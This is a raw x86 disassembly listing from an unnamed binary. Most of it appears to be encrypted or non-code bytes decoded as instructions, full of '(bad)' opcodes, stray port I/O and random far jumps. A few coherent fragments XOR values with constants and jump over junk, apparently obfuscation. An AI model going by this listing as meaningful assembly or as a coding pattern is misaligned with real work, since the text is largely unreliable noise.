  4108e4:	sar    DWORD PTR [edx+eax*2+0x51],0x94
  4108e9:	adc    esp,DWORD PTR [edi]
  4108eb:	push   0xb5a6c4c2
  4108f0:	xchg   ebx,eax
  4108f1:	int    0xba
  4108f3:	addr16 xchg ecx,eax
  4108f5:	xor    bl,bl
  4108f7:	(bad)  
  4108f8:	jecxz  0x4108cf
  4108fa:	inc    ebx
  4108fb:	mov    bh,BYTE PTR [ecx+0x3f659c1]
  410901:	pop    esp
  410902:	dec    esi
  410903:	adc    eax,0x20f02729
  410908:	mov    ?,WORD PTR [ecx-0x286b9f7c]
  41090e:	jg     0x410967
  410910:	xchg   esi,eax
  410911:	int    0x78
  410913:	pop    ds
  410914:	daa    
  410915:	jge    0x4108e6
  410917:	gs xchg ecx,eax
  410919:	pop    eax
  41091a:	inc    ebx
  41091b:	call   0x7e0ba1ef
  410920:	iret   
  410921:	fs jbe 0x410973
  410924:	retf   0x8246
  410927:	pop    eax
  410928:	or     esi,esi
  41092a:	dec    ebx
  41092b:	sbb    esi,esi
  41092d:	icebp  
  41092e:	jl     0x41095a
  410930:	jge    0x4108d9
  410932:	sub    DWORD PTR [edx+0x78ad2a71],esi
  410938:	stos   DWORD PTR es:[edi],eax
  410939:	adc    eax,0xec01a909
  41093e:	inc    eax
  41093f:	sub    ebp,DWORD PTR [edx-0x17]
  410942:	push   eax
  410943:	cmp    DWORD PTR fs:[ecx+0x56],esp
  410947:	xchg   DWORD PTR [edx-0x44eef7e1],ecx
  41094d:	iret   
  41094e:	push   esi
  41094f:	push   ebp
  410950:	add    BYTE PTR [eax+0x256bc020],ch
  410956:	xor    eax,esp
  410958:	mov    edi,0x7438d16
  41095d:	dec    ebp
  41095e:	xlat   BYTE PTR ds:[ebx]
  41095f:	retf   0x6d20
  410962:	jle    0x41092f
  410964:	push   0xffffff8c
  410966:	pop    es
  410967:	add    esi,0xffffffa3
  41096a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41096b:	outs   dx,BYTE PTR ds:[esi]
  41096c:	loop   0x4109d6
  41096e:	mov    bh,0xb0
  410970:	out    dx,al
  410971:	sbb    al,0xe5
  410973:	ja     0x410996
  410975:	cwde   
  410976:	aaa    
  410977:	or     esi,DWORD PTR [edx-0x3f0e2538]
  41097d:	idiv   ecx
  41097f:	xor    eax,0x2e32f691
  410984:	jmp    0x410988
  410986:	out    0x1b,al
  410988:	push   ebx
  410989:	fwait
  41098a:	push   ss
  41098b:	mov    ecx,eax
  41098d:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  41098f:	jmp    0x2f3c:0x8db9e0c2
  410996:	xor    esi,DWORD PTR [esi]
  410998:	call   0x3f0a:0x1b723639
  41099f:	add    al,0x29
  4109a1:	inc    edi
  4109a2:	add    BYTE PTR [ecx+ebp*8-0x3cb88949],0x12
  4109aa:	out    dx,eax
  4109ab:	or     al,ch
  4109ad:	shl    ah,1
  4109af:	out    0x70,eax
  4109b1:	inc    ebp
  4109b2:	sbb    esi,DWORD PTR [eax]
  4109b4:	fist   WORD PTR [ebx]
  4109b6:	jne    0x410997
  4109b8:	add    al,0x31
  4109ba:	jge    0x41095e
  4109bc:	les    edi,FWORD PTR [eax-0x32d4c70b]
  4109c2:	(bad)  
  4109c3:	(bad)  
  4109c5:	into   
  4109c6:	push   ecx
  4109c7:	es xor al,0x5b
  4109ca:	push   esi
  4109cb:	inc    eax
  4109cc:	pop    ebp
  4109cd:	add    ch,dl
  4109cf:	sub    DWORD PTR [eax-0x7f],ebx
  4109d2:	pop    edx
  4109d3:	cmp    al,0x75
  4109d5:	and    bh,BYTE PTR [edx-0x5d]
  4109d8:	out    dx,al
  4109d9:	mov    esp,0x5c0d3bca
  4109de:	es or  ebp,ebp
  4109e1:	cs push esi
  4109e4:	jb     0x410972
  4109e6:	stos   DWORD PTR es:[edi],eax
  4109e7:	(bad)  
  4109e8:	out    dx,eax
  4109e9:	in     al,0xe0
  4109eb:	shr    bh,cl
  4109ed:	fmul   DWORD PTR [ebp-0x9]
  4109f0:	xchg   ebp,eax
  4109f1:	sub    al,0xab
  4109f3:	lods   al,BYTE PTR ds:[esi]
  4109f4:	jl     0x4109e9
  4109f6:	retf   0x3436
  4109f9:	push   edx
  4109fa:	lds    esp,FWORD PTR es:[edx+0x48]
  4109fe:	in     eax,dx
  4109ff:	pop    eax
  410a00:	pop    eax
  410a01:	mov    cl,0x60
  410a03:	call   0xea02:0x5545782d
  410a0a:	adc    ch,BYTE PTR [edi]
  410a0c:	mov    dh,0x1f
  410a0e:	jmp    0x1b34:0xa373db43
  410a15:	xchg   ebx,eax
  410a16:	aam    0x3e
  410a18:	jbe    0x410a68
  410a1a:	in     eax,dx
  410a1b:	frstor [ecx+0x1940933f]
  410a21:	(bad)  
  410a22:	int    0xd2
  410a24:	pop    ds
  410a25:	enter  0xac99,0xc8
  410a29:	push   ecx
  410a2a:	jg     0x410a26
  410a2c:	sbb    BYTE PTR [eax+0x20],ah
  410a2f:	xchg   edi,eax
  410a30:	mov    eax,0x6fa334d5
  410a35:	xor    al,0x7a
  410a37:	mov    ebp,0xf4b3bcf6
  410a3c:	std    
  410a3d:	lods   al,BYTE PTR ds:[esi]
  410a3e:	mov    cs,WORD PTR [edi*2+0x7896882]
  410a45:	jecxz  0x410a97
  410a47:	pop    esp
  410a48:	mov    ecx,0x890c7957
  410a4d:	xchg   edx,eax
  410a4e:	scas   eax,DWORD PTR es:[edi]
  410a4f:	out    0xf2,al
  410a51:	xchg   esp,eax
  410a52:	pop    ebx
  410a53:	push   edx
  410a54:	lock and esp,DWORD PTR ds:0xb270fd20
  410a5b:	lods   al,BYTE PTR ds:[esi]
  410a5c:	xchg   edi,eax
  410a5d:	mov    dh,0x45
  410a5f:	mov    eax,ds:0x5ff0487f
  410a64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a65:	push   cs
  410a66:	out    0x90,al
  410a68:	stos   BYTE PTR es:[edi],al
  410a69:	das    
  410a6a:	jnp    0x410a1a
  410a6c:	aam    0x17
  410a6e:	pop    esp
  410a6f:	(bad)  
  410a71:	in     eax,dx
  410a72:	aaa    
  410a73:	push   ds
  410a74:	je     0x410a58
  410a76:	mov    ch,al
  410a78:	push   es
  410a79:	xchg   esi,eax
  410a7a:	imul   esp,DWORD PTR [esp+ecx*1+0x4e],0x3e
  410a7f:	and    al,0x42
  410a81:	mov    eax,ds:0x69ce4d48
  410a86:	sbb    ecx,ebx
  410a88:	lods   al,BYTE PTR ds:[esi]
  410a89:	sahf   
  410a8a:	aam    0x89
  410a8c:	int3   
  410a8d:	mov    fs,ebx
  410a8f:	jp     0x410af5
  410a91:	loop   0x410a16
  410a93:	jnp    0x410af8
  410a95:	jl     0x410afd
  410a97:	jbe    0x410a97
  410a99:	call   0xf32905a1
  410a9e:	daa    
  410a9f:	mov    al,ds:0x3352edb7
  410aa4:	sub    eax,0xd89a5792
  410aa9:	std    
  410aaa:	pushf  
  410aab:	fist   WORD PTR [ebp-0x25a7e44e]
  410ab1:	ins    BYTE PTR es:[edi],dx
  410ab2:	pop    ecx
  410ab3:	or     eax,0x562e27ac
  410ab8:	sti    
  410ab9:	mov    dl,cl
  410abb:	sub    esi,DWORD PTR [edx+0x10143b30]
  410ac1:	mov    ebp,0x7856c9b5
  410ac6:	(bad)  
  410ac7:	jmp    0x410ae3
  410ac9:	push   ss
  410aca:	mov    edi,0x5034f634
  410acf:	dec    eax
  410ad0:	mov    esi,0xe7cce7d8
  410ad5:	jmp    0xf586:0xbd6a93d4
  410adc:	inc    ebp
  410add:	ins    BYTE PTR es:[edi],dx
  410ade:	and    al,0x5e
  410ae0:	and    eax,0x51861aa5
  410ae5:	mov    al,ds:0x7f0dcc1b
  410aea:	sub    dh,BYTE PTR [bp+si+0x148f]
  410aef:	int    0x2f
  410af1:	dec    eax
  410af2:	mov    esp,0x1a7c1739
  410af7:	arpl   WORD PTR [ecx],cx
  410af9:	ja     0x410b2b
  410afb:	and    DWORD PTR [ebx-0x46f20827],edi
  410b01:	int    0x48
  410b03:	ror    DWORD PTR [ecx+0x2a],cl
  410b06:	mov    ah,al
  410b08:	ins    DWORD PTR es:[edi],dx
  410b09:	push   edi
  410b0a:	or     dh,BYTE PTR [edx-0x7df1f742]
  410b10:	push   es
  410b11:	(bad)  
  410b12:	sti    
  410b13:	pop    esp
  410b14:	ror    BYTE PTR [ebx-0x7c],cl
  410b17:	test   eax,0xf6d7ee4e
  410b1c:	mov    al,0xbd
  410b1e:	push   ecx
  410b1f:	pop    ebp
  410b20:	fcom   st(6)
  410b22:	ja     0x410ad2
  410b24:	adc    DWORD PTR [ecx+0x65fc9f4f],esp
  410b2a:	sub    edx,DWORD PTR [esi+0x3b50fc6a]
  410b30:	xor    ebp,DWORD PTR [ebp-0x5c78a51f]
  410b36:	cld    
  410b37:	dec    BYTE PTR [ebp+0x1c]
  410b3a:	dec    ecx
  410b3b:	pop    esi
  410b3c:	test   ebx,ebx
  410b3e:	sub    esi,ecx
  410b40:	aaa    
  410b41:	ins    BYTE PTR es:[edi],dx
  410b42:	sbb    DWORD PTR [ebx-0x28],eax
  410b45:	shr    BYTE PTR [edx+0x175475db],1
  410b4b:	imul   edx,DWORD PTR [ecx-0x66],0x7276c07
  410b52:	pop    esi
  410b53:	or     ch,cl
  410b55:	call   0xef65f4e3
  410b5a:	dec    esp
  410b5b:	adc    ch,cl
  410b5d:	and    al,0xd9
  410b5f:	mov    eax,ds:0x54463998
  410b64:	pop    esi
  410b65:	je     0x410b73
  410b6b:	mov    eax,DWORD PTR [ebp+0x8]
  410b6e:	jmp    0x410b8c
  410b73:	mov    eax,DWORD PTR [ebp-0x4]
  410b76:	xor    eax,edx
  410b78:	add    eax,ecx
  410b7a:	jmp    0x410b8c
  410b7f:	mov    eax,DWORD PTR [ebp-0x4]
  410b82:	xor    eax,0x7510855
  410b87:	add    eax,0x32729c
  410b8c:	leave  
  410b8d:	ret    0x4
  410b90:	push   ebp
  410b91:	mov    ebp,esp
  410b93:	jmp    0x410f98
  410b98:	outs   dx,DWORD PTR ds:[esi]
  410b99:	mov    WORD PTR ds:0x7191e994,cs
  410b9f:	jae    0x410bc2
  410ba1:	dec    esi
  410ba2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ba3:	repz or ah,BYTE PTR [edi+0x423eb6b2]
  410baa:	jo     0x410c1c
  410bac:	pop    eax
  410bad:	jge    0x410c1f
  410baf:	jo     0x410bb5
  410bb1:	dec    edx
  410bb2:	fwait
  410bb3:	stc    
  410bb4:	pop    edi
  410bb5:	mov    ah,BYTE PTR [ebx+0x3156ced5]
  410bbb:	push   edi
  410bbc:	add    edi,ebp
  410bbe:	call   0xfcc0:0xb13811d6
  410bc5:	pop    ss
  410bc6:	test   DWORD PTR [esi+ebx*1-0x2e],0x2fdaf131
  410bce:	and    al,0xfd
  410bd0:	gs fs pop ds
  410bd3:	es mov ecx,0xd737cb34
  410bd9:	inc    ebx
  410bda:	outs   dx,BYTE PTR ds:[esi]
  410bdb:	sbb    DWORD PTR [esi+eiz*4+0x40],0x68
  410be0:	sub    DWORD PTR [eax],0xffffffe3
  410be3:	jae    0x410bf3
  410be5:	inc    edi
  410be6:	mul    BYTE PTR [esi]
  410be8:	into   
  410be9:	sbb    edx,edi
  410beb:	xchg   BYTE PTR [ecx],bh
  410bed:	pop    esi
  410bee:	call   0x53db:0x5dd1edd3
  410bf5:	outs   dx,BYTE PTR ds:[esi]
  410bf6:	mov    BYTE PTR [eax+0x752d9cfd],ah
  410bfc:	cli    
  410bfd:	sbb    edi,DWORD PTR [esi+eax*1]
  410c00:	test   DWORD PTR [esp+ebp*2+0x39],esp
  410c04:	arpl   bp,di
  410c06:	idiv   BYTE PTR [eax+0x36]
  410c09:	es inc edx
  410c0b:	repz rcl BYTE PTR [bx+si+0x75],1
  410c10:	fwait
  410c11:	push   ecx
  410c12:	lea    edx,[ebp-0x11]
  410c15:	xlat   BYTE PTR ds:[ebx]
  410c16:	jne    0x410b9f
  410c18:	xchg   esi,eax
  410c19:	and    edx,DWORD PTR [ebx-0x119a43a4]
  410c1f:	ror    eax,cl
  410c21:	and    al,BYTE PTR [ebx]
  410c23:	loopne 0x410c9d
  410c25:	cwde   
  410c26:	xlat   BYTE PTR ds:[ebx]
  410c27:	push   esp
  410c28:	loopne 0x410c7a
  410c2a:	ins    DWORD PTR es:[edi],dx
  410c2b:	push   esi
  410c2c:	imul   ecx,edx,0x18
  410c2f:	sub    ecx,DWORD PTR [ecx]
  410c31:	mov    ebp,0xbab61219
  410c36:	xchg   edi,eax
  410c37:	add    eax,0x6a5b572c
  410c3c:	and    BYTE PTR [ecx+edx*8+0x77],ch
  410c40:	ret    
  410c41:	test   eax,0x1f73694f
  410c46:	sbb    al,0x98
  410c48:	mov    edx,0x85b3191e
  410c4d:	int3   
  410c4e:	ins    BYTE PTR es:[edi],dx
  410c4f:	xchg   esp,eax
  410c50:	(bad)  [edx+0x214405d8]
  410c56:	mov    ebp,ds
  410c58:	push   0xffffffff
  410c5a:	rcr    BYTE PTR [edx],cl
  410c5c:	pop    ecx
  410c5d:	sar    ebp,0x54
  410c60:	mov    edx,0x60dc1e8d
  410c65:	movaps XMMWORD PTR [edx+0x3e],xmm1
  410c69:	mov    ebp,0x87724148
  410c6e:	jo     0x410cb1
  410c70:	rol    DWORD PTR [ecx-0x74],0xfb
  410c74:	adc    al,ah
  410c76:	push   cs
  410c77:	out    0xf5,eax
  410c79:	jle    0x410c11
  410c7b:	cmc    
  410c7c:	jbe    0x410ca7
  410c7e:	xor    ah,BYTE PTR [ebp+edi*4+0xb]
  410c82:	imul   edx,DWORD PTR [ebx-0x59],0x7d30be20
  410c89:	fisubr DWORD PTR [edx+0x7e]
  410c8c:	cmp    dh,BYTE PTR [edx-0x6758f495]
  410c92:	mov    fs,edi
  410c94:	jp     0x410ce2
  410c96:	sub    al,dh
  410c98:	sahf   
  410c99:	daa    
  410c9a:	adc    DWORD PTR [esp+ebx*2-0x5d],edi
  410c9e:	imul   esp,DWORD PTR ds:0x59561c86,0xc534fa4b
  410ca8:	jmp    0x45be:0xd8da5065
  410caf:	fs push ebx
  410cb1:	test   al,0x1
  410cb3:	xlat   BYTE PTR ds:[ebx]
  410cb4:	aaa    
  410cb5:	mov    ecx,gs
  410cb7:	inc    edx
  410cb8:	arpl   WORD PTR [edx-0x50dff61a],bp
  410cbe:	push   ecx
  410cbf:	mov    ebx,0xa521195a
  410cc4:	dec    edx
  410cc5:	nop
  410cc6:	adc    al,0xfb
  410cc8:	aam    0x4
  410cca:	retf   0x5e34
  410ccd:	aas    
  410cce:	jae    0x410cc9
  410cd0:	xchg   ebp,eax
  410cd1:	xchg   esp,eax
  410cd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cd3:	out    dx,al
  410cd4:	mov    eax,ds:0x2e9e6ca2
  410cd9:	xchg   esi,eax
  410cda:	mov    dl,0xac
  410cdc:	dec    edx
  410cdd:	pop    esp
  410cde:	mov    esi,DWORD PTR ds:0x344b82f7
  410ce4:	cmp    eax,0xc013b646
  410ce9:	nop
  410cea:	adc    eax,0xcdd15f13
  410cef:	mov    ecx,0xa0efdee0
  410cf4:	retf   0xea6c
  410cf7:	push   ecx
  410cf8:	dec    ebp
  410cf9:	dec    esi
  410cfa:	add    al,0x25
  410cfc:	push   0x6a
  410cfe:	add    al,0xc6
  410d00:	retf   0x7e16
  410d03:	push   ss
  410d04:	scas   al,BYTE PTR es:[edi]
  410d05:	push   esp
  410d06:	fwait
  410d07:	mul    BYTE PTR [ebx-0x39]
  410d0a:	dec    esp
  410d0b:	sub    DWORD PTR [ebp-0x20e2a6de],0x4f
  410d12:	pop    esi
  410d13:	cmp    dl,dh
  410d15:	jb     0x410cc7
  410d17:	outs   dx,DWORD PTR ds:[esi]
  410d18:	xor    eax,0xb3038518
  410d1d:	enter  0xad88,0x69
  410d21:	inc    esp
  410d22:	jle    0x410d4e
  410d24:	stc    
  410d25:	and    DWORD PTR ds:0xe39a60c0,0xf47e2daf
  410d2f:	mov    bh,0xe9
  410d31:	adc    BYTE PTR [esp+eiz*2],ah
  410d34:	imul   DWORD PTR [ecx-0x69]
  410d37:	cmp    edx,DWORD PTR [esi]
  410d39:	push   ebx
  410d3a:	dec    ebp
  410d3b:	lds    ebp,FWORD PTR [edx]
  410d3d:	xor    BYTE PTR [ebp+edx*4-0x6a3fe010],0xe5
  410d45:	sar    BYTE PTR [ecx],0xe9
  410d48:	iret   
  410d49:	mov    dh,al
  410d4b:	xor    cl,BYTE PTR [ebx-0x1d166957]
  410d51:	jnp    0x410d9a
  410d53:	mov    esp,0xa7e64f0b
  410d58:	nop
  410d59:	pushf  
  410d5a:	std    
  410d5b:	test   al,0x56
  410d5d:	fcom   DWORD PTR [ecx-0x21649be8]
  410d63:	xor    BYTE PTR [eax],ah
  410d65:	push   ss
  410d66:	hlt    
  410d67:	mov    ch,0xfb
  410d69:	cmp    ebp,DWORD PTR [esi+0x6]
  410d6c:	xchg   esi,eax
  410d6d:	sub    DWORD PTR [esi],ebp
  410d6f:	inc    esi
  410d70:	xchg   esi,eax
  410d71:	or     esi,edx
  410d73:	xchg   esp,eax
  410d74:	jl     0x410cfd
  410d76:	mov    eax,ds:0x328c91b2
  410d7b:	add    DWORD PTR [ecx+0x273d2b4c],esp
  410d81:	mov    ebp,0x2024319a
  410d86:	mov    esi,0x699a7b99
  410d8b:	pop    esi
  410d8c:	in     al,0x29
  410d8e:	and    BYTE PTR [ebx+0x6f],bh
  410d91:	and    eax,0xbb5cce8
  410d96:	clc    
  410d97:	ja     0x410da1
  410d99:	adc    bl,ch
  410d9b:	push   eax
  410d9c:	mov    es,WORD PTR [edi]
  410d9e:	inc    eax
  410d9f:	in     al,dx
  410da0:	jg     0x410e07
  410da2:	sbb    eax,0x1515886
  410da7:	leave  
  410da8:	mov    dl,0x84
  410daa:	xchg   esp,eax
  410dab:	sahf   
  410dac:	iret   
  410dad:	mov    ebx,0xd7d92aaa
  410db2:	inc    BYTE PTR [edx+0x28]
  410db5:	add    al,0x2b
  410db7:	xchg   esp,eax
  410db8:	mov    bl,0x81
  410dba:	xor    eax,0xf214665
  410dbf:	arpl   WORD PTR [edx],bp
  410dc1:	loope  0x410d86
  410dc3:	outs   dx,DWORD PTR ds:[esi]
  410dc4:	in     al,dx
  410dc5:	sbb    al,0x6c
  410dc7:	cli    
  410dc8:	mov    DWORD PTR [esi],ebx
  410dca:	stos   DWORD PTR es:[edi],eax
  410dcb:	jmp    0xec208642
  410dd0:	fcomp  QWORD PTR [ecx-0x2a]
  410dd3:	fiadd  WORD PTR fs:[eax-0x26f6c00a]
  410dda:	and    eax,DWORD PTR [ebx+ecx*4]
  410ddd:	pop    ebp
  410dde:	pop    ebp
  410ddf:	aam    0x46
  410de1:	sbb    ah,al
  410de3:	out    0xe1,eax
  410de5:	cdq    
  410de6:	cmp    DWORD PTR [edx],eax
  410de8:	aaa    
  410de9:	addr16 xor al,0x4c
  410dec:	in     eax,dx
  410ded:	mul    BYTE PTR [ecx+0x7c]
  410df0:	js     0x410dbf
  410df2:	sub    al,BYTE PTR [ebp-0x14777d9c]
  410df8:	push   cs
  410df9:	in     al,0x11
  410dfb:	clc    
  410dfc:	jmp    0x8e5d3872
  410e01:	push   0x82897ae4
  410e06:	fisttp DWORD PTR [esi+0x4894b79a]
  410e0c:	ficomp DWORD PTR [edi+ecx*4-0x45]
  410e10:	das    
  410e11:	push   ss
  410e12:	mov    WORD PTR [ebx],gs
  410e14:	sbb    dh,bl
  410e16:	(bad)  
  410e17:	xchg   edi,eax
  410e18:	sar    DWORD PTR [ebx-0x57],0xbd
  410e1c:	adc    eax,0x8c93a80c
  410e21:	stos   BYTE PTR es:[edi],al
  410e22:	lods   eax,DWORD PTR ds:[esi]
  410e23:	in     eax,0x93
  410e25:	pop    ss
  410e26:	mov    DWORD PTR [ebx+0x43],esi
  410e29:	call   0x98c8:0xe4b3ee6e
  410e30:	or     BYTE PTR [ebx-0x5],0x73
  410e34:	mov    ebp,0x58795179
  410e39:	cmp    ebp,DWORD PTR ss:[edx-0x52]
  410e3d:	or     DWORD PTR [ebx+edi*4],esi
  410e40:	dec    ebp
  410e41:	test   al,0x89
  410e43:	pop    esi
  410e44:	call   0xc16c:0xdc8d089
  410e4b:	dec    edx
  410e4c:	adc    cl,BYTE PTR [ecx+0x19]
  410e4f:	and    bh,BYTE PTR [ebx+0x71]
  410e52:	push   eax
  410e53:	cli    
  410e54:	push   eax
  410e55:	imul   esp,ebx,0x20
  410e58:	shr    DWORD PTR [edi+0x3ed1789d],cl
  410e5e:	xchg   esi,eax
  410e5f:	icebp  
  410e60:	repnz rol BYTE PTR [ecx+0x2],cl
  410e64:	and    eax,0xc66b658d
  410e69:	xor    edx,DWORD PTR [edi-0x1b08233c]
  410e6f:	pop    ebp
  410e70:	cmp    ecx,0xe84dde1d
  410e76:	mov    cl,bh
  410e78:	repz fdiv st,st(5)
  410e7b:	jo     0x410e57
  410e7d:	not    ecx
  410e7f:	jmp    0x410e90
  410e81:	in     al,0x15
  410e83:	dec    esi
  410e84:	jl     0x410ee1
  410e86:	cmp    BYTE PTR [ebx+0x42],cl
  410e89:	xor    al,0x74
  410e8b:	jne    0x410e9d
  410e8d:	call   0xdfb3:0x528ca478
  410e94:	adc    eax,0xbbc4370e
  410e99:	pusha  
  410e9a:	push   ss
  410e9b:	cld    
  410e9c:	xor    BYTE PTR [ebp-0x38dfedaa],bl
  410ea2:	push   0xffffffbf
  410ea4:	dec    ecx
  410ea5:	scas   eax,DWORD PTR es:[edi]
  410ea6:	add    ah,BYTE PTR [ebp-0x20]
  410ea9:	jg     0x410eae
  410eab:	and    BYTE PTR [esi],ch
  410ead:	fwait
  410eae:	or     ch,bh
  410eb0:	ss pop ss
  410eb2:	test   DWORD PTR [esi],ebx
  410eb4:	dec    edx
  410eb5:	sbb    bh,BYTE PTR ss:[edi+0x6ea9e39a]
  410ebc:	retf   
  410ebd:	mov    ah,BYTE PTR [ecx-0x71]
  410ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ec1:	pandn  mm2,QWORD PTR [esi]
  410ec4:	xchg   ecx,eax
  410ec5:	pop    esi
  410ec6:	dec    ebp
  410ec7:	mov    eax,DWORD PTR [ebp-0x6d6645e7]
  410ecd:	jecxz  0x410f35
  410ecf:	lods   al,BYTE PTR ds:[esi]
  410ed0:	sbb    eax,0xae986b35
  410ed5:	scas   eax,DWORD PTR es:[edi]
  410ed6:	mov    eax,ds:0xebd6526
  410edb:	adc    al,0x16
  410edd:	lea    edx,[ebp-0x78160755]
  410ee3:	jb     0x410ebd
  410ee5:	lahf   
  410ee6:	adc    eax,0x16fd4f65
  410eeb:	push   edx
  410eec:	jne    0x410f35
  410eee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410eef:	inc    eax
  410ef0:	jae    0x410f09
  410ef2:	mov    bl,0xd4
  410ef4:	xor    BYTE PTR [ecx],ch
  410ef6:	ss cmc 
  410ef8:	ret    0x235f
  410efb:	loope  0x410f16
  410efd:	pop    es
  410efe:	scas   eax,DWORD PTR es:[edi]
  410eff:	jae    0x410f5a
  410f01:	test   al,0x4b
  410f03:	jnp    0x410ede
  410f05:	rol    bl,0xb4
  410f08:	pop    ds
  410f09:	(bad)  
  410f0a:	fdivr  st(4),st
  410f0c:	pop    ecx
  410f0d:	sub    al,0x20
  410f0f:	mov    eax,0xcd05b92
  410f14:	(bad)  
  410f15:	cld    
  410f16:	imul   esp,esi,0x6a906f29
  410f1c:	jmp    0x410eac
  410f1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f1f:	sub    eax,0xf0df9b87
  410f24:	sub    DWORD PTR [edx-0x37bf40f6],0x2cee48e8
  410f2e:	mov    cl,0x51
  410f30:	mov    bh,0x87
  410f32:	ret    
  410f33:	dec    edx
  410f34:	les    eax,FWORD PTR [edx-0x62adec56]
  410f3a:	cmp    al,0x4c
  410f3c:	lds    eax,FWORD PTR [edi+0x22]
  410f3f:	jmp    0x410f26
  410f41:	(bad)  
  410f42:	shl    DWORD PTR [ebp+0x17385b5b],cl
  410f48:	xchg   ecx,eax
  410f49:	mov    ds:0x4e60907b,eax
  410f4e:	add    al,0x20
  410f50:	cld    
  410f51:	(bad)  
  410f52:	cmp    DWORD PTR [eax-0x49],esp
  410f55:	out    0x96,al
  410f57:	call   0xefbf0495
  410f5c:	add    eax,0x9e0a8f9d
  410f61:	inc    ebx
  410f62:	push   ds
  410f63:	popf   
  410f64:	aam    0x84
  410f66:	xor    eax,esi
  410f68:	retf   0xf1bd
  410f6b:	fiadd  WORD PTR [eax]
  410f6d:	fwait
  410f6e:	jl     0x410fc8
  410f70:	call   0x68541857
  410f75:	inc    ebx
  410f76:	xor    DWORD PTR ds:0x5fd321d8,0xcbaff964
  410f80:	push   ss
  410f81:	jo     0x410ff9
  410f83:	je     0x410ffe
  410f85:	push   ebp
  410f86:	(bad)  
  410f87:	fdivr  DWORD PTR [ecx-0x74]
  410f8a:	inc    esi
  410f8b:	(bad)  
  410f8c:	mov    al,ds:0x374da8f7
  410f91:	jo     0x410fb4
  410f93:	mov    ah,0xbe
  410f95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410f96:	sbb    BYTE PTR [edi+0x41b22ca1],al
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax+0x4e12af10]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x41104b
  410fdd:	stos   BYTE PTR es:[edi],al
  410fde:	adc    BYTE PTR [ebx+0x3c8d30a7],0x1c
  410fe5:	and    ch,BYTE PTR [ecx+ebx*8+0x60]
  410fe9:	sahf   
  410fea:	outs   dx,BYTE PTR ds:[esi]
  410feb:	mul    edx
  410fed:	in     al,dx
  410fee:	dec    esi
  410fef:	mov    esi,0x981453a
  410ff4:	aaa    
  410ff5:	add    DWORD PTR [ebp+0x6d],0x6e
  410ff9:	push   edi
  410ffa:	ins    BYTE PTR es:[edi],dx
  410ffb:	adc    bl,BYTE PTR ds:0x1a6e7b7c
  411001:	loope  0x410fb7
  411003:	imul   esi,DWORD PTR [ebx-0x50],0x64
  411007:	jbe    0x41105e
  411009:	cmp    al,0x3d
  41100b:	es push ecx
  41100d:	jecxz  0x411058
  41100f:	cld    
  411010:	shl    DWORD PTR [ecx-0x73],1
  411013:	mov    esp,0xa5d0c97e
  411018:	push   edx
  411019:	jecxz  0x410faf
  41101b:	jnp    0x411012
  41101d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41101e:	shl    ebp,1
  411020:	sbb    bl,dl
  411022:	ja     0x410fcc
  411024:	mov    al,ds:0xa2981410
  411029:	mov    ebp,DWORD PTR [ebx+0x7]
  41102c:	das    
  41102d:	adc    bh,BYTE PTR [esi]
  41102f:	iret   
  411030:	push   esp
  411031:	and    BYTE PTR [eax+eax*4],dl
  411034:	das    
  411035:	inc    ebp
  411036:	aad    0xef
  411038:	fs stc 
  41103a:	cmp    bl,BYTE PTR [edx+0x229a7d7c]
  411040:	jle    0x41106a
  411042:	mov    ds:0x44a6bdb9,eax
  411047:	cmp    BYTE PTR [ecx],dh
  411049:	in     al,dx
  41104a:	pusha  
  41104b:	inc    esi
  41104c:	retf   0xc197
  41104f:	push   ebx
  411050:	cmp    ecx,DWORD PTR [ebx]
  411052:	mov    ds:0x72e20921,eax
  411057:	inc    eax
  411058:	jno    0x4110c2
  41105a:	inc    eax
  41105b:	imul   esi,eax,0x69
  41105e:	cmp    DWORD PTR [ebx],esp
  411060:	cli    
  411061:	jmp    0x411019
  411063:	loopne 0x41108c
  411065:	or     bl,BYTE PTR [edi-0x6544c4c8]
  41106b:	mov    cl,0xbf
  41106e:	adc    esp,DWORD PTR [eax+0x2d]
  411071:	call   0x9b196874
  411076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411077:	mov    esp,0x4a8330ea
  41107c:	dec    ecx
  41107d:	adc    BYTE PTR [eax+0x79839918],dl
  411083:	pop    edi
  411084:	or     edx,DWORD PTR [ebx+0x2bf18b71]
  41108a:	mov    ds:0x47557ed1,eax
  41108f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411090:	pushf  
  411091:	jae    0x4110f4
  411093:	push   cs
  411094:	mov    bh,0x10
  411096:	repz xchg ebx,eax
  411098:	xchg   ebx,eax
  411099:	jmp    0x411113
  41109b:	retf   0xd384
  41109e:	cmp    eax,0x54fa1144
  4110a3:	inc    edi
  4110a5:	mov    ch,0x9e
  4110a7:	loopne 0x4110b6
  4110a9:	fbld   TBYTE PTR [ecx+0x5d]
  4110ac:	mov    WORD PTR [edx+0x45],?
  4110af:	cmp    ch,BYTE PTR [ecx+eax*8+0x3b]
  4110b3:	pop    ecx
  4110b4:	leave  
  4110b5:	call   0x9cdc:0xaa1d6e70
  4110bc:	jo     0x41106a
  4110be:	jg     0x4110ee
  4110c0:	push   ebp
  4110c2:	push   ss
  4110c3:	push   ebp
  4110c4:	ds test ecx,edx
